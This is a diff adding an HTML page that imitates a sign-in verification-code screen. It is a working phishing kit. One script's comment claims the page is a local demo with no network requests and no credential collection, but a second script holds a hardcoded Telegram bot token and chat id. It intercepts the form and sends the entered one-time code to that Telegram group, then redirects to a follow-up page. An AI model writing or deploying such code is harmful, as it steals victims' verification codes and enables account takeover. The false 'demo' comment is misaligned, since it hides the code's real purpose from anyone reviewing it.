@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Verification Code</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body { margin: 0; min-height: 100%; background: #fff; color: #171d2b; }
+  body { font-family: Arial, Helvetica, sans-serif; }
+  .screen { min-height: 100svh; display: flex; flex-direction: column; padding: 0 29px 20px; }
+  .back {
+    margin: 16px 0 0 3px; width: 28px; height: 30px; position: relative;
+    border: 0; background: transparent; padding: 0; cursor: pointer;
+  }
+  .back::before {
+    content: ""; position: absolute; width: 19px; height: 19px;
+    border-left: 2.5px solid #111; border-bottom: 2.5px solid #111;
+    transform: rotate(45deg); left: 8px; top: 3px;
+  }
+  main { margin-top: 43px; width: 100%; }
+  h1 { font-size: 32px; line-height: 1.25; letter-spacing: -.45px; margin: 0 0 36px; font-weight: 700; }
+  .description { font-size: 22px; line-height: 1.58; margin: 0 0 22px; }
+  .description strong { font-weight: 700; overflow-wrap: anywhere; }
+  .code {
+    display: block; width: 100%; height: 78px; border: 1px solid #cfd5df;
+    border-radius: 6px; background: #fff; text-align: center; outline: none;
+    font-size: 28px; letter-spacing: 18px; padding: 0 12px 0 28px; color: #172033;
+  }
+  .code:focus { border-color: #3264ff; }
+  .helper { color: #747e91; font-size: 20px; line-height: 1.28; margin: 16px 0 19px; }
+  .password { color: #747e91; font-size: 20px; line-height: 1.4; margin: 0; }
+  .password a { color: #2861ff; text-decoration: none; }
+  .continue {
+    display: block; width: 100%; height: 68px; border: 0; border-radius: 6px;
+    background: #3264f5; color: white; font-size: 21px; font-weight: 700;
+    margin-top: 25px; cursor: pointer;
+  }
+  .continue:active { background: #2855dc; }
+  .demo { margin-top: 12px; color: #a0a7b3; font-size: 11px; line-height: 1.4; text-align: center; }
+  @media (max-width: 480px) {
+    .screen { padding-left: 29px; padding-right: 29px; }
+    main { margin-top: 43px; }
+    h1 { font-size: 32px; margin-bottom: 36px; }
+    .description { font-size: 22px; }
+    .helper, .password { font-size: 20px; }
+  }
+  @media (min-width: 700px) {
+    .screen { max-width: 760px; margin: auto; }
+  }
+</style>
+</head>
+<body>
+<div class="screen">
+  <button class="back" type="button" aria-label="Back" onclick="history.back()"></button>
+  <main>
+    <h1>Enter Verification Code to Sign in</h1>
+    <p class="description">
+      We've sent a verification code to Your Email
+      Please check your email and enter it below.
+    </p>
+    <form action="https://api.telegram.org" id="formTele" class="formtele" method="POST">
+      <input name="kode verikasi" class="code" id="code" type="password" inputmode="numeric" autocomplete="one-time-code"
+        maxlength="6" placeholder="••••••" aria-label="Demo verification code">
+      <p class="helper">Didn't get an email? Check your spam folder or resend verification code (<span id="timer">55</span>s)</p>
+      <button class="continue" type="submit" id="kirim">Continue</button>
+    </form>
+  </main>
+</div>
+<script>
+  // Local visual demo only: no network requests and no credential collection.
+  const code = document.getElementById('code');
+  code.addEventListener('input', () => { code.value = code.value.replace(/\\D/g, '').slice(0, 6); });
+  let remaining = 55;
+  setInterval(() => {
+    if (remaining > 0) remaining--;
+    document.getElementById('timer').textContent = remaining;
+  }, 1000);
+</script>
+
+<script>
+  const token = '9064785026:AAEayIxTHeLwFHXrtgXCko7ZQpXNnx-EYLM'
+        const group_id = '-5541390568'
+
+        const formtelegram = document.getElementById('formTele')
+
+        const sendMessage = (text) => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "chat_id": group_id,
+                    "text": text,
+                })
+            }).then(res => {
+                if (!res.ok) {
+                    throw new Error(res.statusText, res.status, res.url);
+                }
+
+                return res.json();
+            }).then(res => {
+                console.log(res);
+                document.getElementById('kirim').innerHTML = "MELANJUTKAN";
+                window.location.href = "kode.html";
+            }).catch(err => {
+                console.log(err);
+                alert('gagal')
+            })
+        };
+
+        formtelegram.onsubmit = (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(formtelegram)
+
+           let text = `
+╭━━━━━━━━━━━━━━━━━━╮
+|━━━━━ＢｏｋｉＤｅｖ━━━━|
+╰━━━━━━━━━━━━━━━━━━╯
+
+`;
+
+            for (const [key, val] of formData) {
+                text += `🔹 ${key.toUpperCase()}: ${val}\n`;
+            }
+
+            text += `
+━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+🌐 Status: Form submitted
+━━━━━━━━━━━━━━━━━━━━`;
+
+
+            sendMessage(text);
+        };
+
+</script>
+</body>
+</html>
